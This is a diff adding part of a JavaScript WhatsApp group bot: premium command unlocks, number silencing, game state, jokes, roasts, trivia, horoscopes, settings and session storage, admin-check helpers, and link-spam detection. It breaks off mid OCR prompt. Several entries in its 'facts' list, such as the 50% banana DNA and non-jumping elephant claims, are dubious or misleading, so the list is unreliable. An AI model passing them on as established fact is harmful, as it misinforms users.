+    const isUnlocked = (entry) => entry === "all" || (Array.isArray(entry) && (entry.includes("all") || entry.includes(num)));
+    if (isUnlocked(unlocked["allcmds"])) return true;
+    if (isUnlocked(unlocked[cmdKey])) return true;
+    return false;
+}
+function setLockedFor(num, cmd, lock = true) {
+    const data = loadPremium();
+    if (!data.locked_for) data.locked_for = {};
+    const key = (cmd || "").toLowerCase();
+    if (lock) {
+        if (!Array.isArray(data.locked_for[key])) data.locked_for[key] = [];
+        if (!data.locked_for[key].includes(num)) data.locked_for[key].push(num);
+    } else {
+        if (Array.isArray(data.locked_for[key])) {
+            data.locked_for[key] = data.locked_for[key].filter(n => n !== num);
+            if (data.locked_for[key].length === 0) delete data.locked_for[key];
+        }
+    }
+    savePremium(data);
+}
+function setPremiumNumber(num, add = true) {
+    const data = loadPremium();
+    if (!data.premium_numbers) data.premium_numbers = [];
+    if (add) { if (!data.premium_numbers.includes(num)) data.premium_numbers.push(num); }
+    else { data.premium_numbers = data.premium_numbers.filter(n => n !== num); }
+    savePremium(data);
+}
+function unleashCmd(cmd, target) {
+    // cmd = "allcmds" | ".specific"   target = "all" | "2348012345678"
+    const data = loadPremium();
+    if (!data.unlocked_cmds) data.unlocked_cmds = {};
+    const key = cmd.toLowerCase();
+    if (target === "all") {
+        data.unlocked_cmds[key] = "all";
+    } else {
+        if (!Array.isArray(data.unlocked_cmds[key])) data.unlocked_cmds[key] = [];
+        if (!data.unlocked_cmds[key].includes(target)) data.unlocked_cmds[key].push(target);
+    }
+    savePremium(data);
+}
+function lockCmd(cmd) {
+    const data = loadPremium();
+    if (!data.unlocked_cmds) { savePremium(data); return; }
+    if (cmd === "allcmds") { data.unlocked_cmds = {}; data.global_unlock = false; data.premium_numbers = []; }
+    else { delete data.unlocked_cmds[cmd.toLowerCase()]; }
+    savePremium(data);
+}
+
+// --- SILENCED NUMBERS (dev can silence specific numbers per bot) ---
+const SILENCE_FILE = dataPath("silenced.json");
+function loadSilenced() { if (!fs.existsSync(SILENCE_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SILENCE_FILE, "utf8")); } catch { return {}; } }
+function saveSilenced(d) { fs.writeFileSync(SILENCE_FILE, JSON.stringify(d, null, 2)); }
+function isSilenced(botJid, senderJid) { const d = loadSilenced(); const num = (senderJid || "").replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0]; return (d[botJid || "global"] || []).includes(num); }
+function addSilenced(botJid, num) { const d = loadSilenced(); const key = botJid || "global"; if (!d[key]) d[key] = []; if (!d[key].includes(num)) d[key].push(num); saveSilenced(d); }
+function removeSilenced(botJid, num) { const d = loadSilenced(); const key = botJid || "global"; if (d[key]) { d[key] = d[key].filter(n => n !== num); saveSilenced(d); } }
+
+// --- EXTRA DEV NUMBERS (addable at runtime via .adddev) ---
+const EXTRA_DEV_FILE = dataPath("extra_devs.json");
+function loadExtraDevs() { if (!fs.existsSync(EXTRA_DEV_FILE)) return []; try { return JSON.parse(fs.readFileSync(EXTRA_DEV_FILE, "utf8")); } catch { return []; } }
+function saveExtraDevs(d) { fs.writeFileSync(EXTRA_DEV_FILE, JSON.stringify(d, null, 2)); }
+function getRuntimeDevNumbers() { return [...DEV_NUMBERS, ...loadExtraDevs()]; }
+function isRuntimeDev(jid) { if (!jid) return false; const num = jid.replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0]; return getRuntimeDevNumbers().includes(num); }
+
+// --- GAME STATE (hangman, trivia, numguess, scramble) ---
+const hangmanState = {};
+const triviaState = {};
+const numGuessState = {};
+const scrambleState = {};
+
+// --- RANDOM CONTENT ARRAYS ---
+const JOKES = [
+    "Why don't scientists trust atoms? Because they make up everything! 😂",
+    "I told my wife she was drawing her eyebrows too high. She looked surprised. 😂",
+    "Why do cows wear bells? Because their horns don't work! 🐄",
+    "I asked my dog what two minus two is. He said nothing. 🐶",
+    "Why can't you give Elsa a balloon? Because she'll let it go! ❄️",
+    "What do you call a fake noodle? An impasta! 🍝",
+    "Why did the scarecrow win an award? He was outstanding in his field! 🌾",
+    "I'm reading a book about anti-gravity. It's impossible to put down! 📚",
+    "Why did the bicycle fall over? Because it was two-tired! 🚲",
+    "What do you call cheese that isn't yours? Nacho cheese! 🧀",
+    "Why did the math book look so sad? It had too many problems! 📖",
+    "I used to hate facial hair but then it grew on me! 😂",
+    "How do you organize a space party? You planet! 🚀",
+    "Why don't eggs tell jokes? They'd crack each other up! 🥚",
+    "What do you call a sleeping dinosaur? A dino-snore! 🦕",
+];
+const FACTS = [
+    "🧠 Humans share 50% of their DNA with bananas.",
+    "🐘 Elephants are the only animals that can't jump.",
+    "🌍 Nigeria is home to more English speakers than England itself.",
+    "🦈 Sharks are older than trees — they've existed for 450 million years.",
+    "🍯 Honey never expires. 3000-year-old honey found in Egyptian tombs was still edible.",
+    "🌙 A day on Venus is longer than a year on Venus.",
+    "🦋 Butterflies taste with their feet.",
+    "💡 The lighter was invented before the match.",
+    "🐙 Octopuses have three hearts and blue blood.",
+    "🌊 The ocean covers 71% of Earth but 95% of it is still unexplored.",
+    "🧲 A teaspoon of neutron star would weigh 6 billion tonnes.",
+    "🐌 Snails can sleep for up to 3 years.",
+    "🎵 Music can trigger the same brain response as food or sex.",
+    "📱 The first iPhone was released in 2007. WhatsApp didn't exist until 2009.",
+    "🌿 There are more trees on Earth than stars in the Milky Way.",
+];
+const QUOTES = [
+    "💬 \"The secret of getting ahead is getting started.\" — Mark Twain",
+    "💬 \"In the middle of every difficulty lies opportunity.\" — Albert Einstein",
+    "💬 \"It does not matter how slowly you go as long as you do not stop.\" — Confucius",
+    "💬 \"Success is not final; failure is not fatal: it is the courage to continue that counts.\" — Churchill",
+    "💬 \"Believe you can and you're halfway there.\" — Theodore Roosevelt",
+    "💬 \"The only way to do great work is to love what you do.\" — Steve Jobs",
+    "💬 \"Don't watch the clock; do what it does. Keep going.\" — Sam Levenson",
+    "💬 \"An investment in knowledge pays the best interest.\" — Benjamin Franklin",
+    "💬 \"The future belongs to those who believe in the beauty of their dreams.\" — Eleanor Roosevelt",
+    "💬 \"You miss 100% of the shots you don't take.\" — Wayne Gretzky",
+    "💬 \"Hard work beats talent when talent doesn't work hard.\" — Tim Notke",
+    "💬 \"The man who has no imagination has no wings.\" — Muhammad Ali",
+    "💬 \"Fall seven times, stand up eight.\" — Japanese Proverb",
+    "💬 \"No pressure, no diamonds.\" — Thomas Carlyle",
+    "💬 \"A smooth sea never made a skilled sailor.\" — Franklin D. Roosevelt",
+];
+const ROASTS = [
+    "📵 Your WiFi signal has a better connection than your personality.",
+    "🧠 I'd roast you, but my mum said I'm not allowed to burn trash.",
+    "👁️ You have the face of a saint — a Saint Bernard.",
+    "📚 You're proof that evolution can go in reverse.",
+    "💤 I'd agree with you, but then we'd both be wrong.",
+    "🪟 If laughter is the best medicine, your face must be curing diseases.",
+    "🏃 You're not stupid; you just have bad luck thinking.",
+    "🎭 I've seen better looking things crawl out of soup.",
+    "🕹️ You're like a software update. Whenever I see you, I think 'not now'.",
+    "📉 You have miles to go before you reach mediocre.",
+    "🎪 Your brain must be the size of a pebble. Cute, but useless.",
+    "🔋 You have the energy of a dying phone battery.",
+    "🗑️ I'd insult your intelligence, but I'm not sure you have any.",
+    "😴 You're so boring even your phone goes to sleep around you.",
+    "🌚 I'm not saying I hate you, but I'd unplug your life support for a charger.",
+];
+const COMPLIMENTS = [
+    "🌟 You are genuinely one of the most amazing people in this group!",
+    "💛 Your energy brightens up every conversation you're in. Keep shining!",
+    "🏆 You have the kind of intelligence that makes the room smarter.",
+    "🌸 You're the human equivalent of a warm cup of tea on a cold day.",
+    "🎯 You have an incredible ability to make people feel heard and valued.",
+    "🚀 Honestly? The world is better because you're in it.",
+    "💎 You're rare. Not everybody has the depth of character you carry.",
+    "🧠 You think in a way most people can't — and that's your superpower.",
+    "🔥 You work harder than 90% of people and it shows. Respect.",
+    "🌺 Your kindness is contagious. People leave conversations with you feeling better.",
+    "⚡ You have a vibe that can't be faked. Stay real.",
+    "👑 You're built different. Don't ever let anyone dim that.",
+    "🌍 Your potential is literally limitless. Chase it.",
+    "💯 You're exactly the kind of person people are grateful to know.",
+    "🕊️ You make people feel safe. That's a rare and powerful gift.",
+];
+const EIGHTBALL = [
+    "✅ It is certain.", "✅ Without a doubt.", "✅ Yes definitely!",
+    "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.",
+    "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
+    "🤷 Cannot predict now.", "🤷 Concentrate and ask again.",
+    "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
+    "❌ Outlook not so good.", "❌ Very doubtful.",
+];
+const HANGMAN_WORDS = ["phantom","nigeria","whatsapp","telegram","javascript","keyboard","elephant","football","lightning","champion","universe","sunshine","waterfall","mountain","butterfly","network","software","wireless","password","keyboard","government","tropical","abundance","satellite","emergency","community","democracy","education","knowledge","adventure","celebrate","discovery","excellent","beautiful","integrity","creativity","hurricane","evolution","migration","resilience"];
+const TRIVIA_QUESTIONS = [
+    { q: "What is the capital of Nigeria?", a: "abuja", hint: "It starts with A" },
+    { q: "How many states does Nigeria have?", a: "36", hint: "It's a number between 35 and 37" },
+    { q: "What year did Nigeria gain independence?", a: "1960", hint: "Think early 1960s" },
+    { q: "What is 15 × 15?", a: "225", hint: "It's greater than 200" },
+    { q: "Which planet is known as the Red Planet?", a: "mars", hint: "Named after the Roman god of war" },
+    { q: "What is the largest ocean on Earth?", a: "pacific", hint: "It's the biggest" },
+    { q: "How many sides does a hexagon have?", a: "6", hint: "Between 5 and 7" },
+    { q: "What is the chemical symbol for gold?", a: "au", hint: "From the Latin word 'aurum'" },
+    { q: "Who invented the telephone?", a: "bell", hint: "His last name is also a sound" },
+    { q: "What is the fastest land animal?", a: "cheetah", hint: "Spotted big cat" },
+    { q: "What gas do plants absorb?", a: "co2", hint: "Also written as carbon dioxide" },
+    { q: "What is the boiling point of water in Celsius?", a: "100", hint: "Triple digits" },
+    { q: "Which country has the largest population?", a: "india", hint: "South Asian country" },
+    { q: "What is 8 squared?", a: "64", hint: "Between 60 and 70" },
+    { q: "Who wrote Romeo and Juliet?", a: "shakespeare", hint: "Famous English playwright" },
+];
+const RIDDLES = [
+    { q: "I speak without a mouth and hear without ears. I have no body but come alive with wind. What am I?", a: "echo", hint: "You hear me after you speak" },
+    { q: "The more you take, the more you leave behind. What am I?", a: "footsteps", hint: "Think about walking" },
+    { q: "I have cities but no houses. Mountains but no trees. Water but no fish. What am I?", a: "map", hint: "You use me to find places" },
+    { q: "What can you catch but never throw?", a: "cold", hint: "It makes you sneeze" },
+    { q: "I'm tall when young, short when old. What am I?", a: "candle", hint: "I give off light and melt" },
+    { q: "What has hands but can't clap?", a: "clock", hint: "You check me for the time" },
+    { q: "What gets wetter the more it dries?", a: "towel", hint: "You use it after a shower" },
+    { q: "What has many keys but can't open a single lock?", a: "keyboard", hint: "You're typing on one right now... maybe" },
+    { q: "I have a head, a tail, but no body. What am I?", a: "coin", hint: "You flip me for decisions" },
+    { q: "What goes up but never comes down?", a: "age", hint: "Everyone has this and it always increases" },
+    { q: "I'm light as a feather but even the strongest person can't hold me for more than a minute. What am I?", a: "breath", hint: "You're doing it right now" },
+    { q: "What runs but never walks, has a mouth but never talks, has a bed but never sleeps?", a: "river", hint: "Flows through nature" },
+    { q: "The more you have of me, the less you see. What am I?", a: "darkness", hint: "Turn the lights off" },
+    { q: "What can travel around the world while staying in a corner?", a: "stamp", hint: "Found on envelopes" },
+];
+
+const WOULD_U_RATHER = [
+    "Would you rather be able to fly OR be invisible?",
+    "Would you rather lose your phone for a week OR your wallet for a week?",
+    "Would you rather have no internet for a month OR no WhatsApp forever?",
+    "Would you rather be famous but poor OR rich but unknown?",
+    "Would you rather always speak your mind OR never speak again?",
+    "Would you rather live without music OR live without social media?",
+    "Would you rather know when you'll die OR how you'll die?",
+    "Would you rather be 10 years older OR 10 years younger?",
+    "Would you rather have super strength OR super speed?",
+    "Would you rather eat jollof rice every day OR never eat jollof rice again?",
+    "Would you rather be able to talk to animals OR speak every human language?",
+    "Would you rather never use your phone again OR never watch TV again?",
+    "Would you rather have $1 million now OR $5 million in 10 years?",
+    "Would you rather always be cold OR always be hot?",
+    "Would you rather be the funniest person OR the smartest person in the room?",
+];
+
+const HOROSCOPES = {
+    aries:       "🐏 *Aries (Mar 21 – Apr 19)*\n\n🔥 Today your energy is unstoppable. A bold move you've been hesitating on is worth taking. Trust your gut — confidence is your superpower right now.",
+    taurus:      "🐂 *Taurus (Apr 20 – May 20)*\n\n🌿 Slow down and enjoy today. Good things are building behind the scenes. Don't rush — your patience will pay off more than you expect.",
+    gemini:      "👯 *Gemini (May 21 – Jun 20)*\n\n💨 Your mind is sharp and your words carry weight today. A conversation you have could open a new door. Stay curious.",
+    cancer:      "🦀 *Cancer (Jun 21 – Jul 22)*\n\n🌊 Emotions run deep today. Protect your peace — not everyone deserves access to your energy. Focus on people who reciprocate your love.",
+    leo:         "🦁 *Leo (Jul 23 – Aug 22)*\n\n☀️ You're in your element. People are watching and taking notes. This is your moment to lead and shine — own it.",
+    virgo:       "♍ *Virgo (Aug 23 – Sep 22)*\n\n📋 Your attention to detail saves the day. Something that seemed messy is becoming clearer. Trust the process you've been working on.",
+    libra:       "⚖️ *Libra (Sep 23 – Oct 22)*\n\n🎨 Balance is key today. A situation that felt unfair may find resolution. Beauty, harmony and peace are drawn to you right now.",
+    scorpio:     "🦂 *Scorpio (Oct 23 – Nov 21)*\n\n🔮 Deep insights are coming. What seemed hidden is being revealed. Use your instincts — you already know more than you think.",
+    sagittarius: "🏹 *Sagittarius (Nov 22 – Dec 21)*\n\n🌟 Adventure is calling. You're being pulled toward something bigger. Say yes to new experiences — growth is waiting.",
+    capricorn:   "🐐 *Capricorn (Dec 22 – Jan 19)*\n\n🏔️ Discipline wins today. Stay focused on your goals and ignore the noise. The hard work you've been putting in is closer to payoff than you think.",
+    aquarius:    "🏺 *Aquarius (Jan 20 – Feb 18)*\n\n⚡ You're ahead of your time and people are starting to notice. Share your ideas — your unique thinking is your greatest asset.",
+    pisces:      "🐟 *Pisces (Feb 19 – Mar 20)*\n\n🌙 Trust your dreams and intuition today. A creative idea or feeling you've dismissed deserves another look. Magic is in the details.",
+};
+
+const SCRAMBLE_WORDS = [
+    { word: "phantom", hint: "👻 A ghost-like entity" },
+    { word: "nigeria", hint: "🌍 A West African country" },
+    { word: "android", hint: "🤖 A mobile operating system" },
+    { word: "football", hint: "⚽ The world's most popular sport" },
+    { word: "telegram", hint: "📱 A messaging app" },
+    { word: "music", hint: "🎵 Sound organized in time" },
+    { word: "laptop", hint: "💻 A portable computer" },
+    { word: "jungle", hint: "🌿 A thick tropical forest" },
+    { word: "diamond", hint: "💎 The hardest natural material" },
+    { word: "chicken", hint: "🐔 A common farm bird" },
+    { word: "airport", hint: "✈️ Where planes take off and land" },
+    { word: "market", hint: "🛒 A place to buy and sell" },
+    { word: "ocean", hint: "🌊 A massive body of saltwater" },
+    { word: "kingdom", hint: "👑 A land ruled by a king or queen" },
+    { word: "battery", hint: "🔋 Stores electrical energy" },
+    { word: "thunder", hint: "⛈️ The loud sound after lightning" },
+    { word: "glasses", hint: "👓 Used to correct eyesight" },
+    { word: "blanket", hint: "🛏️ Keeps you warm while sleeping" },
+    { word: "village", hint: "🏡 A small rural settlement" },
+    { word: "captain", hint: "⚓ Leader of a ship or team" },
+];
+
+// Saved group names: { groupJid: groupName }
+const groupNames = {};
+
+// Auto-react: { groupJid: emoji }
+const AUTO_REACT_FILE = dataPath("auto_react.json");
+function loadAutoReact() { if (!fs.existsSync(AUTO_REACT_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REACT_FILE, "utf8")); } catch { return {}; } }
+function saveAutoReact(d) { fs.writeFileSync(AUTO_REACT_FILE, JSON.stringify(d, null, 2)); }
+
+// Auto-reply keywords: { keyword: replyText }
+const AUTO_REPLY_FILE = dataPath("auto_reply.json");
+function loadAutoReply() { if (!fs.existsSync(AUTO_REPLY_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REPLY_FILE, "utf8")); } catch { return {}; } }
+function saveAutoReply(d) { fs.writeFileSync(AUTO_REPLY_FILE, JSON.stringify(d, null, 2)); }
+
+// Command aliases: { alias: realCommand }
+const ALIASES_FILE = dataPath("aliases.json");
+function loadAliases() { if (!fs.existsSync(ALIASES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(ALIASES_FILE, "utf8")); } catch { return {}; } }
+function saveAliases(d) { fs.writeFileSync(ALIASES_FILE, JSON.stringify(d, null, 2)); }
+
+// Presence tracker: { jid: 'available'|'unavailable'|'composing'|... }
+const presenceTracker = {};
+
+// --- SETTINGS ---
+function loadSettings() {
+    if (!fs.existsSync(SETTINGS_FILE)) return {};
+    try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch { return {}; }
+}
+
+function saveSettings(settings) {
+    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
+}
+
+function getGroupSetting(groupJid, key, def = false) {
+    const s = loadSettings();
+    return s[groupJid]?.[key] ?? def;
+}
+
+function setGroupSetting(groupJid, key, value) {
+    const s = loadSettings();
+    if (!s[groupJid]) s[groupJid] = {};
+    s[groupJid][key] = value;
+    saveSettings(s);
+}
+
+function loadBotSecurity() {
+    if (!fs.existsSync(BOT_SECURITY_FILE)) return {};
+    try { return JSON.parse(fs.readFileSync(BOT_SECURITY_FILE, "utf8")); } catch { return {}; }
+}
+
+function saveBotSecurity(data) {
+    fs.writeFileSync(BOT_SECURITY_FILE, JSON.stringify(data, null, 2));
+}
+
+function getBotSecurity(botJid, key, def = false) {
+    const data = loadBotSecurity();
+    const id = botJid || "global";
+    return data[id]?.[key] ?? def;
+}
+
+function setBotSecurity(botJid, key, value) {
+    const data = loadBotSecurity();
+    const id = botJid || "global";
+    if (!data[id]) data[id] = {};
+    data[id][key] = value;
+    saveBotSecurity(data);
+}
+
+function isSuspiciousBugPayload(text) {
+    return !!detectBugPatterns(text);
+}
+function getBugPayloadReasons(text) { return detectBugPatterns(text) || []; }
+
+// --- BOT MODE (public / owner) ---
+function loadModes() {
+    if (!fs.existsSync(MODE_FILE)) return {};
+    try { return JSON.parse(fs.readFileSync(MODE_FILE, "utf8")); } catch { return {}; }
+}
+function saveModes(d) { fs.writeFileSync(MODE_FILE, JSON.stringify(d, null, 2)); }
+function getBotMode(botJid) {
+    if (!botJid) return "public";
+    return loadModes()[botJid] || "public";
+}
+function setBotMode(botJid, mode) {
+    const d = loadModes();
+    d[botJid] = mode;
+    saveModes(d);
+}
+
+// --- MENU THEME ---
+function loadThemeData() {
+    if (!fs.existsSync(THEME_FILE)) return {};
+    try { return JSON.parse(fs.readFileSync(THEME_FILE, "utf8")); } catch { return {}; }
+}
+function getMenuTheme(botJid) {
+    if (!botJid) return 1;
+    return loadThemeData()[botJid] || 1;
+}
+function setMenuTheme(botJid, n) {
+    const d = loadThemeData();
+    d[botJid] = n;
+    fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
+}
+
+// --- ECLIPSE MENU STYLE: "loading" (animated bar) | "classic" (still 3-stage) ---
+function getMenuStyle(botJid) {
+    const d = loadThemeData();
+    const id = botJid || "global";
+    return d[`__style__${id}`] === "classic" ? "classic" : "loading";
+}
+function setMenuStyle(botJid, style) {
+    const d = loadThemeData();
+    const id = botJid || "global";
+    d[`__style__${id}`] = style === "classic" ? "classic" : "loading";
+    fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
+}
+
+// --- BOT PERSONA: "eclipse" (default, dark) | "astraea" (golden, divine) ---
+function getBotPersona(botJid) {
+    const d = loadThemeData();
+    const id = botJid || "global";
+    return d[`__persona__${id}`] === "astraea" ? "astraea" : "eclipse";
+}
+function setBotPersona(botJid, persona) {
+    const d = loadThemeData();
+    const id = botJid || "global";
+    d[`__persona__${id}`] = persona === "astraea" ? "astraea" : "eclipse";
+    fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
+}
+
+// --- HELPERS ---
+function getAuthDir(userId) {
+    return dataPath("auth_info", String(userId));
+}
+
+function clearAuthState(userId) {
+    const authDir = getAuthDir(userId);
+    if (fs.existsSync(authDir)) fs.rmSync(authDir, { recursive: true, force: true });
+    if (typeof githubSync !== "undefined" && githubSync.triggerSync) {
+        githubSync.triggerSync(true);
+    }
+}
+
+// --- SESSION PERSISTENCE ---
+function loadSessions() {
+    if (!fs.existsSync(SESSIONS_FILE)) return {};
+    try { return JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8")); } catch { return {}; }
+}
+
+function saveSession(userId, phoneNumber, chatId, isBusiness = false) {
+    const sessions = loadSessions();
+    sessions[userId] = { phoneNumber, chatId, isBusiness };
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
+    if (typeof githubSync !== "undefined" && githubSync.triggerSync) {
+        githubSync.triggerSync(true);
+    }
+}
+
+function deleteSession(userId) {
+    const sessions = loadSessions();
+    delete sessions[userId];
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
+    if (typeof githubSync !== "undefined" && githubSync.triggerSync) {
+        githubSync.triggerSync(true);
+    }
+}
+
+// Build a ctx-like wrapper using chat ID so we can send Telegram messages after restart
+function makeFakeCtx(chatId) {
+    return {
+        reply: (text, extra) => telBot.telegram.sendMessage(chatId, text, extra || {}),
+        from: { id: chatId },
+    };
+}
+
+function formatUptime() {
+    const s = Math.floor(process.uptime());
+    const h = Math.floor(s / 3600);
+    const m = Math.floor((s % 3600) / 60);
+    const sec = s % 60;
+    return `${h}h ${m}m ${sec}s`;
+}
+
+// --- TARGET RESOLVER (reply-or-number for any cmd that needs a target user) ---
+// Returns a JID or null. Accepts: replied message, @mention, or raw phone number.
+function resolveTargetJid(msg, parts) {
+    const ctx = msg.message?.extendedTextMessage?.contextInfo;
+    if (ctx?.participant) return ctx.participant;
+    if (Array.isArray(ctx?.mentionedJid) && ctx.mentionedJid.length) return ctx.mentionedJid[0];
+    for (const tok of parts.slice(1)) {
+        const digits = tok.replace(/\D/g, "");
+        if (digits.length >= 7) return `${digits}@s.whatsapp.net`;
+    }
+    return null;
+}
+
+// --- GROUP ADMIN HELPERS ---
+// Modern WhatsApp uses two JID formats per user: @s.whatsapp.net (phone) and @lid (random opaque ID).
+// The same person can appear under either format depending on context, so admin checks must
+// compare across formats. These helpers normalize that.
+
+// Strip device suffix (":N") and domain. Returns the bare local part.
+function jidLocal(jid) {
+    if (!jid) return "";
+    return String(jid).split(":")[0].split("@")[0];
+}
+
+// Returns the JID domain (@s.whatsapp.net, @lid, @g.us, etc.) or "" if none.
+function jidDomain(jid) {
+    if (!jid) return "";
+    const i = String(jid).indexOf("@");
+    return i >= 0 ? String(jid).slice(i) : "";
+}
+
+// True if the two JIDs refer to the same user.
+// Handles cross-format (lid vs s.whatsapp.net) by comparing locals when domains match,
+// and falling back to literal/normalized equality otherwise.
+function isSameUser(a, b) {
+    if (!a || !b) return false;
+    if (a === b) return true;
+    const la = jidLocal(a), lb = jidLocal(b);
+    if (!la || !lb) return false;
+    const da = jidDomain(a), db = jidDomain(b);
+    // Same domain (both lid or both s.whatsapp.net) — locals must match
+    if (da && db && da === db) return la === lb;
+    // Different domains — only safe to match if both locals look like phone numbers
+    const isPhoneNum = s => /^\d{7,}$/.test(s);
+    if (isPhoneNum(la) && isPhoneNum(lb)) return la === lb;
+    // Otherwise (mixing lid id with phone number, etc.) we can't safely equate
+    return false;
+}
+
+// Collect every JID variant we know for the sender of a message.
+// In groups: msg.key.participant (display JID) + participantPn + participantLid.
+// In DMs: msg.key.remoteJid is the user.
+function getSenderJids(msg) {
+    const set = new Set();
+    const k = msg?.key || {};
+    if (k.participant) set.add(k.participant);
+    if (k.participantPn) set.add(k.participantPn);
+    if (k.participantLid) set.add(k.participantLid);
+    if (msg?.participant) set.add(msg.participant);
+    if (!k.participant && !k.participantPn && !k.participantLid && k.remoteJid && !String(k.remoteJid).endsWith("@g.us")) {
+        set.add(k.remoteJid);
+    }
+    set.delete("");
+    return [...set];
+}
+
+// True if any of the candidate JIDs matches any JID in the admin set (cross-format aware).
+function isJidAdmin(candidates, adminSet) {
+    if (!adminSet || !adminSet.size) return false;
+    for (const c of candidates) {
+        if (!c) continue;
+        if (adminSet.has(c)) return true;
+        for (const a of adminSet) if (isSameUser(a, c)) return true;
+    }
+    return false;
+}
+
+async function getGroupRoles(sock, groupJid) {
+    try {
+        const meta = await sock.groupMetadata(groupJid);
+        const admins = new Set(meta.participants.filter(p => p.admin).map(p => p.id));
+        // Collect every JID the bot might appear as in this group:
+        //  - sock.user.id (its main login JID, often phone-based)
+        //  - sock.user.lid (its lid alias if any)
+        //  - phone-based variant of sock.user.id
+        const botCandidates = [];
+        if (sock.user?.id) botCandidates.push(sock.user.id);
+        if (sock.user?.lid) botCandidates.push(sock.user.lid);
+        const botBaseNum = jidLocal(sock.user?.id || "");
+        if (botBaseNum) botCandidates.push(botBaseNum + "@s.whatsapp.net");
+        const botIsAdmin = isJidAdmin(botCandidates, admins);
+        return { admins, botIsAdmin, meta, botCandidates };
+    } catch { return { admins: new Set(), botIsAdmin: false, meta: null, botCandidates: [] }; }
+}
+
+// --- AFK store ---
+function loadAfk() { try { return JSON.parse(fs.readFileSync("afk.json", "utf8")); } catch { return {}; } }
+function saveAfk(d) { try { fs.writeFileSync("afk.json", JSON.stringify(d, null, 2)); } catch {} }
+function setAfk(jid, reason) { const d = loadAfk(); d[jid] = { reason: reason || "AFK", since: Date.now() }; saveAfk(d); }
+function clearAfk(jid) { const d = loadAfk(); delete d[jid]; saveAfk(d); }
+function getAfk(jid) { return loadAfk()[jid] || null; }
+
+// --- Profile stats store ---
+function loadStats() { try { return JSON.parse(fs.readFileSync("profile_stats.json", "utf8")); } catch { return {}; } }
+function saveStats(d) { try { fs.writeFileSync("profile_stats.json", JSON.stringify(d, null, 2)); } catch {} }
+function bumpStat(groupJid, userJid) {
+    const d = loadStats();
+    if (!d[groupJid]) d[groupJid] = {};
+    d[groupJid][userJid] = (d[groupJid][userJid] || 0) + 1;
+    saveStats(d);
+}
+
+// --- COMMAND RECEIPT REACTION ---
+async function reactToCmd(sock, msg, status = "received") {
+    const map = { received: "⚡", ok: "✅", fail: "❌", working: "⏳" };
+    try { await sock.sendMessage(msg.key.remoteJid, { react: { text: map[status] || "⚡", key: msg.key } }); } catch (_) {}
+}
+
+function fetchBuffer(url, redirectCount = 0) {
+    return new Promise((resolve, reject) => {
+        if (redirectCount > 5) return reject(new Error("Too many redirects"));
+        const mod = url.startsWith("https") ? https : http;
+        mod.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
+            // Follow redirects (301, 302, 303, 307, 308)
+            if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
+                return fetchBuffer(res.headers.location, redirectCount + 1).then(resolve).catch(reject);
+            }
+            if (res.statusCode && res.statusCode >= 400) {
+                return reject(new Error(`HTTP ${res.statusCode}`));
+            }
+            const chunks = [];
+            res.on("data", (c) => chunks.push(c));
+            res.on("end", () => resolve(Buffer.concat(chunks)));
+            res.on("error", reject);
+        }).on("error", reject);
+    });
+}
+
+function containsLink(text) {
+    if (!text) return false;
+    const patterns = [
+        /https?:\/\/\S+/i,
+        /\bwww\.[\w-]+\.[a-z]{2,}/i,
+        /\bwa\.me\/\S+/i,
+        /\bchat\.whatsapp\.com\/\S+/i,
+        /\bt\.me\/\S+/i,
+        /\bdiscord\.(gg|com)\/\S+/i,
+        /\b(?:bit\.ly|tinyurl\.com|goo\.gl|cutt\.ly|ow\.ly|is\.gd|shorturl\.at|rb\.gy|t\.co)\/\S+/i,
+        /\b(?:youtube|youtu|instagram|facebook|fb|twitter|x|tiktok|snapchat|pinterest|reddit|linkedin|github|twitch|spotify|soundcloud|medium|whatsapp|telegram|vimeo|dailymotion|netflix|amazon|ebay|walmart|target|shopify|etsy|alibaba|aliexpress)\.[a-z]{2,}\/?\S*/i,
+        /\b[\w-]+\.(?:com|net|org|io|co|gg|app|dev|xyz|site|store|online|live|link|page|cc)\b\/\S*/i,
+    ];
+    return patterns.some(re => re.test(text));
+}
+
+function containsMassMention(msg) {
+    const ctx = msg.message?.extendedTextMessage?.contextInfo;
+    const m = Array.isArray(ctx?.mentionedJid) ? ctx.mentionedJid : [];
+    return m.length >= 5; // 5+ mentions in one message = mass mention
+}
+
+// --- FETCH JSON (for APIs) ---
+function fetchJSON(url) {
+    return new Promise((resolve, reject) => {
+        https.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
+            let data = "";
+            res.on("data", c => data += c);
+            res.on("end", () => { try { resolve(JSON.parse(data)); } catch { reject(new Error("Invalid JSON")); } });
+            res.on("error", reject);
+        }).on("error", reject);
+    });
+}
+
+// --- RESOLVE GROUP LINK OR JID ---
+async function resolveGroupJid(sock, input) {
+    input = input.trim();
+    if (input.endsWith("@g.us")) return input;
+    if (input.includes("chat.whatsapp.com/")) {
+        const code = input.split("chat.whatsapp.com/")[1].trim();
+        const info = await sock.groupGetInviteInfo(code);
+        return info.id;
+    }
+    throw new Error("Invalid input. Use a group link (chat.whatsapp.com/...) or group ID (ending in @g.us).");
+}
+
+// --- OCR (Extract text from image via Gemini Vision — much more accurate) ---
+async function ocrFromBuffer(imageBuffer, mimeType = "image/jpeg") {
+    const GEMINI_KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+    const OCR_PROMPT =
+        "You are an expert OCR engine. Extract and return ALL text from this image exactly as it appears.\n" +
+        "This includes:\n" +
+        "- Printed/typed text\n" +
